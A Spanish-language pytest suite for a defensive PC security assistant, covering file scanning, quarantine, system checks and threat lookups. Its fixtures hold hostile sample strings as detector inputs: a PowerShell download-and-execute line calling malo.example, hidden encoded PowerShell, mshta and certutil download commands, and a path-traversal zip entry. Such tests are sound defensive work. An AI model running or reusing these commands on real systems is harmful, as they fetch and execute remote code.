"""Pruebas de skills y de la revisión de archivos."""

import asyncio
import json
import zipfile
from pathlib import Path
from types import SimpleNamespace as NS

import httpx
import pytest
from fastapi.testclient import TestClient

from asistente_core.agent import skills
from asistente_core.seguridad import analisis
from asistente_core.tools import seguridad as tseg

from .test_core import _embed_falso, _parte

EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
REGLAS = analisis.Reglas([analisis.REGLAS_MONI])


def _analizar(ruta: Path) -> analisis.Informe:
    return analisis.analizar(ruta, REGLAS, usar_defender=False, consultar_internet=False)


def _detalles(inf: analisis.Informe) -> str:
    return " | ".join(h["detalle"] for h in inf.hallazgos)


# ---------------------------------------------------------------- skills


def test_skills_incluidas_se_leen_bien():
    s = skills.Skills([skills.INCLUIDAS], _embed_falso)
    nombres = {k.nombre for k in s.todas()}
    assert {"revisar-archivo", "revisar-descargas", "pc-lenta", "copias-de-seguridad"} <= nombres
    for k in s.todas():
        assert len(k.ejemplos) >= 5 and k.pasos and k.titulo


def test_skill_elegida_por_parecido_y_las_tuyas_ganan(tmp_path, monkeypatch):
    propia = tmp_path / "revisar-archivo"
    propia.mkdir()
    (propia / "SKILL.md").write_text(
        "---\nname: revisar-archivo\ntitle: Mi versión\nexamples:\n  - revisa este archivo\n---\n"
        "1. Paso propio.\n",
        encoding="utf-8",
    )
    s = skills.Skills([skills.INCLUIDAS, tmp_path], _embed_falso)
    monkeypatch.setattr(skills, "UMBRAL", 0.5)
    candidatas = s.candidatas("revisa este archivo por favor")
    assert candidatas and candidatas[0].titulo == "Mi versión"
    assert s.candidatas("pizza margarita grande") == []
    elegida = candidatas[0]
    msg = skills.mensaje_skill(elegida)
    assert msg["role"] == "system" and "Paso propio" in msg["content"]


def test_websocket_avisa_y_pasa_la_skill(monkeypatch):
    import asistente_core.main as m
    from asistente_core.memory.historial import Historial

    s = skills.Skills([skills.INCLUIDAS], _embed_falso)
    monkeypatch.setattr(skills, "UMBRAL", 0.5)
    skills.usar(s)
    vistos = []

    async def falso_stream(mensajes, tools):
        vistos.append(list(mensajes))
        yield _parte("Listo.")

    async def nunca(texto, anterior=""):
        raise AssertionError("con una skill activa no se decide investigar")

    async def la_primera(texto, candidatas):
        assert candidatas
        return candidatas[0]

    real = m.responder
    monkeypatch.setattr(
        m,
        "responder",
        lambda ctx, turno, confirmar, **kw: real(ctx, turno, falso_stream, confirmar, **kw),
    )
    monkeypatch.setattr(m, "necesita_internet", nunca)
    monkeypatch.setattr(m, "elegir_skill", la_primera)
    monkeypatch.setattr(m, "historial", Historial(":memory:"))
    try:
        with TestClient(m.app).websocket_connect("/ws") as ws:
            ws.receive_json()
            ws.send_json({"type": "chat", "text": "revisa mis descargas"})
            ev = ws.receive_json()
            assert ev == {
                "type": "skill",
                "name": "revisar-descargas",
                "title": "Revisar una carpeta",
            }
            assert ws.receive_json()["type"] == "token"
            assert ws.receive_json()["type"] == "done"
        assert "revisar_carpeta" in vistos[0][-2]["content"]
    finally:
        skills.usar(None)


# ---------------------------------------------------------------- revisión de archivos


def test_eicar_es_peligroso(tmp_path):
    p = tmp_path / "prueba.txt"
    p.write_bytes(EICAR)
    inf = _analizar(p)
    assert inf.veredicto == "peligroso" and "EICAR" in _detalles(inf)
    assert len(inf.sha256) == 64


def test_doble_extension_y_programa_disfrazado(tmp_path):
    p = tmp_path / "factura.pdf.exe"
    p.write_bytes(b"MZ" + b"\x00" * 200)
    inf = _analizar(p)
    assert inf.veredicto == "peligroso"
    assert "Doble extensión" in _detalles(inf)
    # pefile no puede leer este .exe falso: se anota y se sigue
    assert any("programa" in n for n in inf.no_revisado)

    q = tmp_path / "foto.jpg"
    q.write_bytes(b"MZ" + b"\x00" * 200)
    assert "en realidad es un programa" in _detalles(_analizar(q))

    r = tmp_path / ("contrato" + chr(0x202E) + "fdp.exe")
    r.write_bytes(b"MZ")
    assert "invisibles" in _detalles(_analizar(r))


def test_pdf_con_javascript_ofuscado(tmp_path):
    p = tmp_path / "doc.pdf"
    p.write_bytes(
        b"%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction 2 0 R >> endobj\n"
        b"2 0 obj << /S /J#61vaScript /JS (app.alert(1)) >> endobj\n%%EOF"
    )
    c = analisis.contar_pdf(p.read_bytes())
    assert c["JavaScript"] == 1 and c["OpenAction"] == 1
    inf = _analizar(p)
    assert inf.veredicto == "peligroso" and "JavaScript" in _detalles(inf)

    limpio = tmp_path / "limpio.pdf"
    limpio.write_bytes(b"%PDF-1.7\n1 0 obj << /Type /Catalog >> endobj\n%%EOF")
    assert _analizar(limpio).veredicto == "sin hallazgos"


def _docx(ruta: Path, rels: str = "") -> None:
    with zipfile.ZipFile(ruta, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document>Hola</w:document>")
        if rels:
            z.writestr("word/_rels/settings.xml.rels", rels)


def test_word_limpio_y_con_plantilla_remota(tmp_path):
    limpio = tmp_path / "carta.docx"
    _docx(limpio)
    inf = _analizar(limpio)
    assert inf.tipo == "documento de Word" and inf.veredicto == "sin hallazgos"
    assert "No tiene macros" in inf.datos

    malo = tmp_path / "cv.docx"
    _docx(
        malo,
        '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/'
        'officeDocument/2006/relationships/attachedTemplate" Target="http://malo.example/t.dotm" '
        'TargetMode="External"/></Relationships>',
    )
    inf = _analizar(malo)
    assert inf.veredicto == "peligroso" and "plantilla" in _detalles(inf)


def test_macros_que_se_ejecutan_solas(tmp_path, monkeypatch):
    class VBAFalso:
        def __init__(self, ruta):
            pass

        def detect_vba_macros(self):
            return True

        def detect_xlm_macros(self):
            return False

        def analyze_macros(self):
            return [
                ("AutoExec", "Document_Open", ""),
                ("Suspicious", "Shell", ""),
                ("IOC", "http://malo.example/x.exe", ""),
            ]

        def close(self):
            pass

    import oletools.olevba

    monkeypatch.setattr(oletools.olevba, "VBA_Parser", VBAFalso)
    inf = analisis.Informe("x.docm")
    analisis.revisar_office(Path("x.docm"), inf)
    assert inf.veredicto == "peligroso"
    assert "malo.example" in _detalles(inf)


def test_zip_con_ejecutable_y_scripts(tmp_path):
    z = tmp_path / "fotos.zip"
    with zipfile.ZipFile(z, "w") as f:
        f.writestr("foto1.jpg", b"\xff\xd8\xff")
        f.writestr("ver_fotos.scr", b"MZ")
    assert "ver_fotos.scr" in _detalles(_analizar(z))

    s = tmp_path / "actualizar.ps1"
    s.write_text(
        "$c = New-Object Net.WebClient; IEX $c.DownloadString('http://malo.example/a.ps1')"
    )
    inf = _analizar(s)
    assert inf.veredicto == "sospechoso" and "Descarga código" in _detalles(inf)

    b = tmp_path / "abrir.bat"
    b.write_text("powershell -w hidden -enc " + "A" * 60)
    assert "PowerShell" in _detalles(_analizar(b))


def test_texto_normal_sin_hallazgos(tmp_path):
    p = tmp_path / "notas.txt"
    p.write_text("Comprar pan, leche y café.\nLlamar a mamá.")
    inf = _analizar(p)
    assert inf.veredicto == "sin hallazgos" and "nota" in inf.como_dict()


def test_reglas_propias_del_usuario(tmp_path):
    (tmp_path / "mias.yar").write_text(
        'rule Palabra { meta: severity = "high" description = "Palabra prohibida" '
        'strings: $a = "pikachu" condition: $a }'
    )
    (tmp_path / "rota.yar").write_text("rule { esto no compila")
    reglas = analisis.Reglas([analisis.REGLAS_MONI, tmp_path])
    p = tmp_path / "x.txt"
    p.write_text("hola pikachu")
    inf = analisis.analizar(p, reglas, usar_defender=False, consultar_internet=False)
    assert inf.veredicto == "peligroso" and "Palabra prohibida" in _detalles(inf)
    assert reglas.errores and "rota.yar" in reglas.errores[0]


def test_consulta_solo_el_hash():
    pedidos = []

    def api(req: httpx.Request) -> httpx.Response:
        pedidos.append(req)
        if "circl" in req.url.host:
            return httpx.Response(404)
        return httpx.Response(
            200, json={"query_status": "ok", "data": [{"signature": "AgentTesla"}]}
        )

    cliente = httpx.Client(transport=httpx.MockTransport(api))
    r = analisis.consultar_hash("ab" * 32, "clave", cliente)
    assert r == {"conocido": None, "malware": "AgentTesla"}
    assert pedidos[1].headers["Auth-Key"] == "clave"
    assert all(len(p.content) < 200 for p in pedidos)  # nunca se envía el archivo


# ---------------------------------------------------------------- rutas


def test_resolver_rutas(tmp_path):
    descargas = tmp_path / "Downloads"
    (descargas / "sub").mkdir(parents=True)
    (descargas / "factura.pdf").write_bytes(b"%PDF")
    (descargas / "sub" / "contrato.docx").write_bytes(b"PK")
    (tmp_path / "Desktop").mkdir()
    assert tseg.resolver("factura.pdf", home=tmp_path) == descargas / "factura.pdf"
    assert tseg.resolver("Descargas/factura.pdf", home=tmp_path) == descargas / "factura.pdf"
    assert tseg.resolver("contrato.docx", home=tmp_path).name == "contrato.docx"
    assert tseg.resolver(str(descargas / "factura.pdf")) == descargas / "factura.pdf"
    assert tseg.resolver("descargas", home=tmp_path) == descargas
    with pytest.raises(ValueError, match="Quizás"):
        tseg.resolver("factura.pd", home=tmp_path)
    with pytest.raises(ValueError, match="No encontré"):
        tseg.resolver("nada-que-ver.xyz", home=tmp_path)


def test_revisar_carpeta(tmp_path, monkeypatch):
    (tmp_path / "Downloads").mkdir()
    (tmp_path / "Downloads" / "a.txt").write_bytes(EICAR)
    (tmp_path / "Downloads" / "b.txt").write_text("hola")
    monkeypatch.setattr(tseg, "_HOME", tmp_path)
    monkeypatch.setattr(
        tseg, "carpeta_conocida", lambda n, home=tmp_path: tseg.CARPETAS and tmp_path / "Downloads"
    )
    r = tseg.revisar_carpeta("descargas")
    assert r["revisados"] == 2 and r["resumen"]["peligroso"] == 1
    assert r["archivos"][0]["archivo"] == "a.txt"


def test_clasificador_de_skills(monkeypatch):
    """El modelo confirma la skill; si dice "ninguna" o falla, no se usa ninguna."""
    from asistente_core.agent import router

    s = skills.Skills([skills.INCLUIDAS], _embed_falso)
    cands = [k for k in s.todas() if k.nombre in ("revisar-archivo", "pc-lenta")]
    respuestas = iter(['{"skill": "pc-lenta"}', '{"skill": "ninguna"}'])
    pedidos = []

    class Falso:
        async def chat(self, **kw):
            pedidos.append(kw)
            return NS(message=NS(content=next(respuestas)))

    monkeypatch.setattr(router, "_client", Falso())
    elegida = asyncio.run(router.elegir_skill("la pc va lenta", cands))
    assert elegida.nombre == "pc-lenta"
    assert asyncio.run(router.elegir_skill("¿qué es un virus?", cands)) is None
    enum = pedidos[0]["format"]["properties"]["skill"]["enum"]
    assert set(enum) == {"revisar-archivo", "pc-lenta", "ninguna"}
    assert asyncio.run(router.elegir_skill("x", [])) is None


def test_firma_valida_quita_pistas_debiles():
    inf = analisis.Informe("x.exe")
    inf.datos.append("No tiene firma digital")
    inf.hallar("baja", "Importa muy pocas funciones")
    inf.hallar("media", "Algo serio")
    analisis.anotar_firma(
        {"estado": "Valid", "firmante": "CN=Microsoft Corporation, O=Microsoft"}, inf
    )
    assert [h["gravedad"] for h in inf.hallazgos] == ["media"]
    assert inf.datos == ["Firma digital válida de Microsoft Corporation"]
    analisis.anotar_firma({"estado": "HashMismatch", "firmante": ""}, inf)
    assert inf.veredicto == "peligroso"


# ---------------------------------------------------------------- cuarentena


def test_cuarentena_aparta_y_devuelve(tmp_path):
    from asistente_core.seguridad.cuarentena import Cuarentena

    c = Cuarentena(tmp_path / "cuarentena")
    original = tmp_path / "Downloads" / "factura.pdf.exe"
    original.parent.mkdir()
    contenido = b"MZ" + bytes(range(256)) * 10
    original.write_bytes(contenido)

    ficha = c.poner(original, "doble extensión")
    assert not original.exists()
    guardado = tmp_path / "cuarentena" / f"{ficha['id']}.moni"
    assert guardado.read_bytes()[:2] != b"MZ"  # desactivado: ya no es un .exe válido
    assert [f["nombre"] for f in c.listar()] == ["factura.pdf.exe"]
    with pytest.raises(ValueError, match="ya está en la cuarentena"):
        c.poner(guardado)

    # si en su lugar apareció otro archivo, no se pisa
    original.write_bytes(b"nuevo")
    r = c.restaurar("factura")
    assert Path(r["restaurado_en"]).name == "factura.pdf (restaurado).exe"
    assert Path(r["restaurado_en"]).read_bytes() == contenido
    assert original.read_bytes() == b"nuevo"
    assert c.listar() == []


def test_cuarentena_detecta_copia_danada(tmp_path):
    from asistente_core.seguridad.cuarentena import Cuarentena

    c = Cuarentena(tmp_path / "q")
    a = tmp_path / "a.txt"
    a.write_bytes(b"hola mundo")
    f = c.poner(a)
    (tmp_path / "q" / f"{f['id']}.moni").write_bytes(b"roto")
    with pytest.raises(ValueError, match="dañada"):
        c.restaurar(f["id"])
    assert not a.exists() and c.listar()  # no se tocó nada


def test_herramientas_de_cuarentena_piden_confirmacion(tmp_path, monkeypatch):
    from asistente_core.permissions.policy import Nivel
    from asistente_core.seguridad.cuarentena import Cuarentena
    from asistente_core.tools.registry import REGISTRO

    assert REGISTRO["poner_en_cuarentena"].nivel is Nivel.CONFIRMAR
    assert REGISTRO["sacar_de_cuarentena"].nivel is Nivel.CONFIRMAR
    assert REGISTRO["ver_cuarentena"].nivel is Nivel.LIBRE
    monkeypatch.setattr(tseg, "_cuarentena", Cuarentena(tmp_path / "q"))
    p = tmp_path / "virus.exe"
    p.write_bytes(b"MZ")
    pregunta = REGISTRO["poner_en_cuarentena"].resumen(ruta=str(p))
    assert "virus.exe" in pregunta and "cuarentena" in pregunta
    tseg.poner_en_cuarentena(str(p), "prueba")
    assert tseg.ver_cuarentena()[0]["motivo"] == "prueba"
    assert "Se apartó por: prueba" in REGISTRO["sacar_de_cuarentena"].resumen(archivo="virus.exe")
    with pytest.raises(ValueError):  # no existe: se cancela sin preguntar
        REGISTRO["sacar_de_cuarentena"].resumen(archivo="otro.exe")


# ---------------------------------------------------------------- chequeo de la PC


def test_chequeo_todo_bien():
    from datetime import datetime

    from asistente_core.seguridad import equipo

    datos = {
        "windows": {
            "defender": {"activo": True, "tiempo_real": True, "dias_firmas": 0},
            "firewall": [
                {"perfil": "Domain", "activo": True},
                {"perfil": "Public", "activo": True},
            ],
            "ultima_actualizacion": "2026-10-20",
            "uac": 1,
            "tareas": [
                {"nombre": "GoogleUpdate", "accion": r"C:\Program Files\Google\Update.exe /ua"}
            ],
        },
        "inicio_registro": [
            {"nombre": "Discord", "comando": r'"C:\Users\a\AppData\Local\Discord\Update.exe"'}
        ],
        "puertos": [{"puerto": 445, "programa": "System"}],
    }
    r = equipo.evaluar(datos, hoy=datetime(2026, 11, 4))
    assert r["riesgo"] == [] and r["atencion"] == []
    assert len(r["bien"]) == 4 and r["informativo_arrancan_solos"] == ["Discord"]


def test_chequeo_detecta_problemas():
    from datetime import datetime

    from asistente_core.seguridad import equipo

    datos = {
        "windows": {
            "defender": {"activo": True, "tiempo_real": False, "dias_firmas": 1},
            "firewall": {"perfil": "Public", "activo": False},
            "ultima_actualizacion": "2026-07-01",
            "uac": 0,
            "tareas": {
                "nombre": "Updater",
                "accion": "powershell.exe -w hidden -enc SQBFAFgA",
            },
        },
        "inicio_registro": [
            {"nombre": "svchost", "comando": r"C:\Users\a\AppData\Local\Temp\svchost.exe"}
        ],
        "inicio_carpetas": [{"nombre": "x.vbs", "comando": r"wscript C:\x.vbs"}],
        "puertos": [{"puerto": 3389, "programa": "svchost.exe"}],
        "procesos_raros": [{"programa": "a.exe", "ruta": r"C:\Users\a\Downloads\a.exe"}],
        "errores": ["puertos: acceso denegado"],
    }
    r = equipo.evaluar(datos, hoy=datetime(2026, 11, 4))
    texto = " ".join(r["riesgo"])
    assert "tiempo real" in texto and "firewall" in texto and "UAC" in texto
    assert "126 días" in texto
    atencion = " ".join(r["atencion"])
    assert "svchost" in atencion and "x.vbs" in atencion and "Updater" in atencion
    assert "Escritorio remoto" in atencion and "a.exe" in atencion
    assert r["no_revisado"] == ["puertos: acceso denegado"]


def test_comandos_y_rutas_raras():
    from asistente_core.seguridad import equipo

    assert equipo.es_ruta_rara(r"C:\Users\a\AppData\Local\Temp\x.exe")
    assert equipo.es_ruta_rara(r"C:\Users\a\AppData\Roaming\x.exe")
    assert not equipo.es_ruta_rara(r"C:\Users\a\AppData\Roaming\Spotify\Spotify.exe")
    assert not equipo.es_ruta_rara(r"C:\Program Files\App\app.exe")
    assert equipo.comando_raro("mshta http://x") is not None
    assert equipo.comando_raro(r'"C:\Program Files\Steam\steam.exe" -silent') is None


# ---------------------------------------------------------------- conocimiento de seguridad

_STIX = {
    "objects": [
        {"type": "x-mitre-collection", "id": "x", "x_mitre_version": "20.0"},
        {
            "type": "attack-pattern",
            "id": "ap1",
            "name": "Data Encrypted for Impact",
            "description": "Adversaries may encrypt data (Citation: X) to extort [ransom](https://x).",
            "external_references": [{"source_name": "mitre-attack", "external_id": "T1486"}],
            "kill_chain_phases": [{"phase_name": "impact"}],
            "x_mitre_platforms": ["Windows", "Linux"],
        },
        {
            "type": "attack-pattern",
            "id": "ap2",
            "name": "Mshta",
            "description": "Adversaries may abuse mshta.exe.",
            "external_references": [{"source_name": "mitre-attack", "external_id": "T1218.005"}],
            "kill_chain_phases": [{"phase_name": "stealth"}],
            "x_mitre_platforms": ["Windows"],
        },
        {
            "type": "attack-pattern",
            "id": "ap3",
            "name": "Solo macOS",
            "description": "x",
            "external_references": [{"source_name": "mitre-attack", "external_id": "T9999"}],
            "x_mitre_platforms": ["macOS"],
        },
        {
            "type": "attack-pattern",
            "id": "ap4",
            "name": "Revocada",
            "revoked": True,
            "external_references": [{"source_name": "mitre-attack", "external_id": "T0001"}],
        },
        {"type": "course-of-action", "id": "m1", "name": "Data Backup"},
        {
            "type": "malware",
            "id": "s1",
            "name": "Emotet",
            "description": "[Emotet](https://x) is a downloader.",
            "x_mitre_aliases": ["Emotet", "Geodo"],
            "external_references": [{"source_name": "mitre-attack", "external_id": "S0367"}],
            "x_mitre_platforms": ["Windows"],
        },
        {
            "type": "relationship",
            "id": "r1",
            "relationship_type": "mitigates",
            "source_ref": "m1",
            "target_ref": "ap1",
        },
        {
            "type": "relationship",
            "id": "r2",
            "relationship_type": "uses",
            "source_ref": "s1",
            "target_ref": "ap2",
        },
    ]
}
_LOLBAS = [
    {
        "Name": "Certutil.exe",
        "Description": "Windows binary used for handling certificates",
        "Commands": [
            {
                "Command": "certutil.exe -urlcache -f {REMOTEURL} {PATH}",
                "Usecase": "Download file from Internet",
                "Category": "Download",
                "Privileges": "User",
                "MitreID": "T1105",
            }
        ],
        "Full_Path": [{"Path": "C:\\Windows\\System32\\certutil.exe"}],
    }
]


def _saber(tmp_path):
    from asistente_core.seguridad import saber

    def api(req: httpx.Request) -> httpx.Response:
        return httpx.Response(200, json=_STIX if "mitre" in str(req.url) else _LOLBAS)

    s = saber.Saber(tmp_path / "seguridad")
    assert s.necesita_actualizar()
    resumen = s.actualizar(httpx.Client(transport=httpx.MockTransport(api)))
    assert resumen == {"attack": "2 técnicas, 1 programas", "lolbas": "1 programas de Windows"}
    assert not s.necesita_actualizar()
    return s


def test_attack_compacto_y_busqueda(tmp_path):
    s = _saber(tmp_path)
    t = s.buscar_attack("T1486")[0]
    assert t["tacticas"] == ["impacto"] and t["mitigaciones"] == ["Data Backup"]
    assert "Citation" not in t["descripcion"] and "](" not in t["descripcion"]
    assert s.buscar_attack("¿qué es un ransomware?")[0]["id"] == "T1486"  # concepto común
    assert s.buscar_attack("geodo")[0]["nombre"] == "Emotet"  # por alias
    assert s.buscar_attack("S0367")[0]["tecnicas"] == ["T1218.005"]
    assert s.buscar_attack("T9999") == [] and s.buscar_attack("T0001") == []
    assert s.buscar_attack("de la") == []


def test_lolbas_sin_comandos_de_abuso(tmp_path):
    s = _saber(tmp_path)
    e = s.buscar_lolbas(r"C:\Windows\System32\CERTUTIL.EXE")
    assert e["abusos"] == ["Download file from Internet"]
    assert "-urlcache" not in json.dumps(e)  # el comando concreto nunca se guarda
    assert s.buscar_lolbas("certutil")["nombre"] == "Certutil.exe"
    assert s.buscar_lolbas("chrome.exe") is None


def test_herramientas_de_conocimiento(tmp_path, monkeypatch):
    monkeypatch.setattr(tseg, "conocimiento_seguridad", _saber(tmp_path))
    r = tseg.consultar_programa_windows("certutil.exe")
    assert r["en_lolbas"] and r["fuente"] == "LOLBAS Project"
    assert tseg.consultar_programa_windows("notepad++.exe")["en_lolbas"] is False
    f = tseg.consultar_attack("ransomware")[0]
    assert f["fuente"] == "MITRE ATT&CK T1486" and f["como_protegerse"] == ["Data Backup"]
    assert "nota" in tseg.consultar_attack("xyzzy")[0]


def test_sin_descargar_avisa(tmp_path):
    from asistente_core.seguridad import saber

    with pytest.raises(ValueError, match="actualizar_conocimiento_de_seguridad"):
        saber.Saber(tmp_path).buscar_attack("phishing")


# ---------------------------------------------------------------- eventos de Windows (Hayabusa)


def test_resumen_de_alertas_de_hayabusa():
    from asistente_core.seguridad import eventos

    def alerta(titulo, nivel, ts, cmd="x"):
        return json.dumps(
            {
                "Timestamp": ts,
                "RuleTitle": titulo,
                "Level": nivel,
                "Channel": "Sysmon",
                "Details": {"Cmdline": cmd, "LGUID": "no-importa"},
            }
        )

    lineas = [
        alerta("PowerShell Base64", "med", "2026-11-01 10:00:00.000 -04:00"),
        alerta("Mshta Remote", "high", "2026-11-02 09:00:00.000 -04:00", "mshta http://malo"),
        alerta("PowerShell Base64", "med", "2026-11-03 10:00:00.000 -04:00"),
        alerta("Log Cleared", "crit", "2026-11-03 11:00:00.000 -04:00"),
        "no es json",
    ]
    r = eventos.resumir(lineas)
    assert r["total_alertas"] == 4
    assert r["por_nivel"] == {"crítico": 1, "alto": 1, "medio": 2}
    assert [a["alerta"] for a in r["alertas"]] == [
        "Log Cleared",
        "Mshta Remote",
        "PowerShell Base64",
    ]
    ps = r["alertas"][2]
    assert (
        ps["veces"] == 2
        and ps["primera"] == "2026-11-01 10:00"
        and ps["ultima"] == "2026-11-03 10:00"
    )
    assert r["alertas"][1]["ejemplo"] == "Cmdline: mshta http://malo"
    assert eventos.resumir([])["nota"].startswith("Sin alertas")


def test_argumentos_de_hayabusa(tmp_path):
    from asistente_core.seguridad import eventos

    h = eventos.Hayabusa(tmp_path)
    a = h.argumentos(tmp_path / "o.jsonl", 7, tmp_path / "logs")
    assert a[:3] == ["dfir-timeline", "-d", str(tmp_path / "logs")]
    assert "-w" in a and a[a.index("-m") + 1] == "medium" and a[-1] == "7d"
    assert h.argumentos(tmp_path / "o.jsonl", 0, None)[1] == "-l"  # en vivo; mínimo 1 día
    assert h.argumentos(tmp_path / "o.jsonl", 0, None)[-1] == "1d"


def _zip_hayabusa(nombres):
    import io

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for n in nombres:
            z.writestr(n, b"x")
    return buf.getvalue()


def test_instalar_hayabusa_comprueba_el_hash(tmp_path):
    import hashlib

    from asistente_core.seguridad import eventos

    contenido = _zip_hayabusa(
        ["hayabusa-4.3.1-win-x64.exe", "encoded_rules.yml", "../../fuera.txt"]
    )
    cliente = httpx.Client(
        transport=httpx.MockTransport(lambda req: httpx.Response(200, content=contenido))
    )
    h = eventos.Hayabusa(tmp_path / "h")
    h.instalar(cliente, sha256=hashlib.sha256(contenido).hexdigest())
    assert h.instalado()
    assert not (tmp_path / "fuera.txt").exists()  # sin rutas que escapen de la carpeta
    assert (tmp_path / "h" / "fuera.txt").exists()

    otro = eventos.Hayabusa(tmp_path / "m")
    with pytest.raises(ValueError, match="no coincide"):
        otro.instalar(cliente)  # el hash fijado de 4.3.1 no es el de este zip de prueba
    assert not (tmp_path / "m").exists()
    assert eventos.HASHES[eventos.VERSION]  # la versión fijada siempre tiene su hash


def test_evento_completo_pide_confirmacion():
    from asistente_core.permissions.policy import Nivel
    from asistente_core.tools.registry import REGISTRO

    assert REGISTRO["revisar_eventos_de_windows"].nivel is Nivel.LIBRE
    assert REGISTRO["revisar_eventos_completo"].nivel is Nivel.CONFIRMAR
    assert "administrador" in REGISTRO["revisar_eventos_completo"].resumen(dias=3)
    params = REGISTRO["revisar_eventos_de_windows"].esquema["function"]["parameters"]
    assert "completo" not in params["properties"]  # el modelo no puede elevar por su cuenta


def test_skill_run_first_consulta_antes(monkeypatch):
    """Una skill con run_first hace que el núcleo ejecute la herramienta antes de responder."""
    import asistente_core.main as m
    from asistente_core.memory.historial import Historial

    s = skills.Skills([skills.INCLUIDAS], _embed_falso)
    explicar = next(k for k in s.todas() if k.nombre == "explicar-amenaza")
    assert explicar.antes == "consultar_attack"
    vistos, llamadas = [], []

    async def falso_stream(mensajes, tools):
        vistos.append(list(mensajes))
        yield _parte("Un keylogger registra lo que escribes. (Fuente: MITRE ATT&CK T1056.001)")

    async def esta(texto, candidatas):
        return explicar

    async def falso_ejecutar(nombre, args, confirmar=None):
        llamadas.append((nombre, args))
        return True, '[{"id": "T1056.001", "nombre": "Keylogging"}]'

    real = m.responder
    monkeypatch.setattr(
        m,
        "responder",
        lambda ctx, turno, confirmar, **kw: real(ctx, turno, falso_stream, confirmar, **kw),
    )
    monkeypatch.setattr(m, "elegir_skill", esta)
    monkeypatch.setattr(m, "ejecutar_herramienta", falso_ejecutar)
    monkeypatch.setattr(m, "historial", Historial(":memory:"))
    skills.usar(s)
    monkeypatch.setattr(skills, "UMBRAL", -1.0)
    try:
        with TestClient(m.app).websocket_connect("/ws") as ws:
            ws.receive_json()
            ws.send_json({"type": "chat", "text": "¿qué es un keylogger?"})
            assert ws.receive_json()["type"] == "skill"
            assert ws.receive_json()["status"] == "start"
            assert ws.receive_json()["status"] == "end"
            assert ws.receive_json()["type"] == "token"
            assert ws.receive_json()["type"] == "done"
    finally:
        skills.usar(None)
    assert llamadas == [("consultar_attack", {"consulta": "¿qué es un keylogger?"})]
    assert [x["role"] for x in vistos[0][-2:]] == ["assistant", "tool"]


# ---------------------------------------------------------------- MCP y REA


def test_mcp_solo_herramientas_permitidas():
    from asistente_core.integrations.mcp_cliente import NoPermitida, ServidorMCP

    s = ServidorMCP("REA", "node", ["x"], frozenset({"inspect_pe_imports"}))
    with pytest.raises(NoPermitida):
        asyncio.run(s.llamar_varias([("load_frida_script", {"source": "x"})]))


def test_mcp_normaliza_resultados_v1_y_v2():
    from asistente_core.integrations.mcp_cliente import _normalizar

    v2 = NS(is_error=False, structured_content={"a": 1}, content=[])
    v1 = NS(isError=False, structuredContent=None, content=[NS(text='{"b": 2}')])
    err = NS(is_error=True, structured_content=None, content=[NS(text="falló")])
    assert _normalizar(v2) == {"ok": True, "datos": {"a": 1}}
    assert _normalizar(v1) == {"ok": True, "datos": {"b": 2}}
    assert _normalizar(err) == {"ok": False, "error": "falló"}


def test_rea_resumen_en_lenguaje_sencillo():
    from asistente_core.integrations import rea

    def imp(*funcs):
        return {
            "normalized_result": {
                "format": "pe32-plus",
                "bits": 64,
                "imports": [
                    {"name": "KERNEL32.dll", "functions": [{"name": f} for f in funcs]},
                    {"name": "USER32.dll", "functions": []},
                ],
            }
        }

    nada = {"ok": False, "error": "x"}
    r = rea.resumir(
        imp("IsDebuggerPresent", "LoadLibraryW", "CreateFileW", "InternetOpenW"),
        nada,
        nada,
        nada,
        nada,
        nombre="app.exe",
    )
    assert r["puede"] == ["conectarse a internet o a la red", "leer, crear o borrar archivos"]
    assert "a_vigilar" not in r  # IsDebuggerPresent y LoadLibrary no alarman

    espia = rea.resumir(
        imp(
            "SetWindowsHookExW",
            "GetAsyncKeyState",
            "BitBlt",
            "WriteProcessMemory",
            "VirtualAllocEx",
        ),
        nada,
        nada,
        nada,
        nada,
    )
    assert set(espia["a_vigilar"]) == {
        "leer el teclado o el ratón",
        "capturar la pantalla",
        "meterse en la memoria de otros programas",
    }
    assert "nota_importaciones" in espia  # pocas funciones: puede haber más

    net = {
        "ok": True,
        "datos": {"normalized_result": {"summary": {"classification": {
            "status": "managed", "runtime_family": "modern-dotnet", "implementation": "cil"}}}},
    }  # fmt: skip
    r = rea.resumir(imp(), nada, nada, net, nada)
    assert r["tecnologia"].startswith(".NET") and "código administrado" in r["puede"][0]
    assert (
        "explicar_programa" in __import__("asistente_core.tools.registry", fromlist=["x"]).REGISTRO
    )
